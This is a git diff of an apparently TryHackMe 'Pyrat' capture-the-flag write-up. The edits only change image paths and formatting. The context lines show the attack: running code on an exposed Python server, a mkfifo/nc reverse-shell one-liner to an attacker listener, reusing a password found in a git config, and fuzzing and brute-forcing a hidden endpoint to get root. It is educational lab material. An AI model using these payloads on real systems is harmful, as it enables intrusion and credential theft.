@@ -8,7 +8,7 @@ pin: false
 math: true
 mermaid: true
 image:
-  path: /assets/img/2024-10-09-writeup-tryhackme-pyrat/pyrat.webp
+  path: /assets/img/thm/pyrat/pyrat.webp
 ---
 
 ### Overview
@@ -81,7 +81,7 @@ We have 2 ports open:
 
 When we navigate to http://10.10.167.212:8000 we get the message: “Try a more basic connection!”
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/try_more_basic.webp)
+![](/assets/img/thm/pyrat/try_more_basic.webp)
 
 Let’s try it with curl too:
 
@@ -89,7 +89,7 @@ Let’s try it with curl too:
 curl http://10.10.167.212:8000 -i
 ```
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/try_with_curl.webp)
+![](/assets/img/thm/pyrat/try_with_curl.webp)
 
 We can see in the response headers that the server is `SimpleHTTP/0.6 Python/3.11.2` and the response body is the same as before: "Try a more basic connection."
 
@@ -101,7 +101,7 @@ nc 10.10.167.212 8000
 
 With this command, we establish a connection with the server but we get nothing from it. Let’s try and see if we can run python code
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/py_code_exec.webp)
+![](/assets/img/thm/pyrat/py_code_exec.webp)
 
 We can see that the server executed our code. We can now try to get a reverse shell using the following one-liner payload:
 
@@ -111,7 +111,7 @@ import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <L
 
 Don’t forget to replace `<LHOST>` and `<LPORT>` with the IP and Port of your listener.
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/rev_shell.webp)
+![](/assets/img/thm/pyrat/rev_shell.webp)
 
 We got a shell back!
 
@@ -119,17 +119,17 @@ After some exploration, we stumble upon an interesting folder at `/opt/dev`. Lis
 
 When we try to execute basic git commands we get an error basically saying that this repo doesn’t belong to our user:
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/dubious_ownership_git.webp)
+![](/assets/img/thm/pyrat/dubious_ownership_git.webp)
 
 We can see that the user `think` is the owner of this repo.
 
 With further digging, we find a password inside `/opt/dev/.git/config`:
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/think_user_password.webp)
+![](/assets/img/thm/pyrat/think_user_password.webp)
 
 If we try this password with ssh, we are able to login to the machine as think and get the user flag at `/home/think/user.txt`:
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/user_flag.webp)
+![](/assets/img/thm/pyrat/user_flag.webp)
 
 Now that we have a shell as think, let’s see what was in that git repository.
 
@@ -137,7 +137,7 @@ Now that we have a shell as think, let’s see what was in that git repository.
 git status
 ```
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/git_status.webp)
+![](/assets/img/thm/pyrat/git_status.webp)
 
 We can see that there was a file named `pyrat.py.old`. Let’s restore it and see its contents:
 
@@ -187,13 +187,13 @@ But before that, let’s see how the server behaves when it is provided a valid 
 
 For the valid endpoint, let’s just try `shell`:
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/valid_endpoint.webp)
+![](/assets/img/thm/pyrat/valid_endpoint.webp)
 
 We can see that the shell endpoint works as shown in the python code (it spawns a shell). Now for an invalid endpoint (`invalid123`):
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/invalid_endpoint.webp)
+![](/assets/img/thm/pyrat/invalid_endpoint.webp)
 
-We get the message: “name ‘invalid123’ is not defined”.
+We get the message: “`name ‘invalid123’ is not defined`”.
 
 Now we have enough information to write a script that will help us discover new endpoints.
 
@@ -234,7 +234,7 @@ for endpoint in wlist:
 wlist.close()
 ```
 
-This script will first connect to the server with help of the socket module. Once connected, it will loop through the wordlist (defined in the WORDLIST_PATH variable) and send each of the word to the server. If the response from the server fulfills the following criteria:
+This script will first connect to the server with help of the socket module. Once connected, it will loop through the wordlist (defined in the `WORDLIST_PATH` variable) and send each of the word to the server. If the response from the server fulfills the following criteria:
 
 - Does not contain "is not defined" : This is the response we got earlier for an invalid endpoint
 - Does not contain "`<string>`" : For some words, the server will return and error usually containing "`<string>`"
@@ -244,11 +244,11 @@ It is considered a potential valid endpoint and the script prompt us if we want 
 
 > Feel free to improve the script to your liking
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/endpoint_fuzz_script.webp)
+![](/assets/img/thm/pyrat/endpoint_fuzz_script.webp)
 
 After running the script, we eventually get the right endpoint. Let’s try it!
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/entering_valid_endpoint.webp)
+![](/assets/img/thm/pyrat/entering_valid_endpoint.webp)
 
 We are prompted for a password…
 
@@ -258,11 +258,11 @@ If we go back to the room’s description:
 
 We see that we are supposed to brute-force the password too. As we did previously, let’s see how the application behaves when given an invalid password.
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/3_wrong_pass.webp)
+![](/assets/img/thm/pyrat/3_wrong_pass.webp)
 
 We see that after 3 attempts, the server stops asking for the password and behaves like we just connected to it. So let’s try re-entering the valid endpoint:
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/re_enter_valid_endpoint.webp)
+![](/assets/img/thm/pyrat/re_enter_valid_endpoint.webp)
 
 After re-entering the valid endpoint, we get prompted for the password again…
 
@@ -322,7 +322,7 @@ temp_wlist.close()
 os.system("rm /tmp/tmp_wlist")
 ```
 
-This script is similar to the first one, the difference being it will create a temporary wordlist from the provided wordlist in the WORDLIST_PATH variable. This temporary wordlist will contain the valid endpoint once every 4 words, for example:
+This script is similar to the first one, the difference being it will create a temporary wordlist from the provided wordlist in the `WORDLIST_PATH` variable. This temporary wordlist will contain the valid endpoint once every 4 words, for example:
 
 **Original wordlist**
 
@@ -350,10 +350,10 @@ pass5
 
 If we run the script:
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/brute_force_script.webp)
+![](/assets/img/thm/pyrat/brute_force_script.webp)
 
 Well, looks like we got it…
 
-![](/assets/img/2024-10-09-writeup-tryhackme-pyrat/root_flag.webp)
+![](/assets/img/thm/pyrat/root_flag.webp)
 
-We spawn a shell as root and get the root flag at /root/root.txt.
+We spawn a shell as root and get the root flag at `/root/root.txt`.
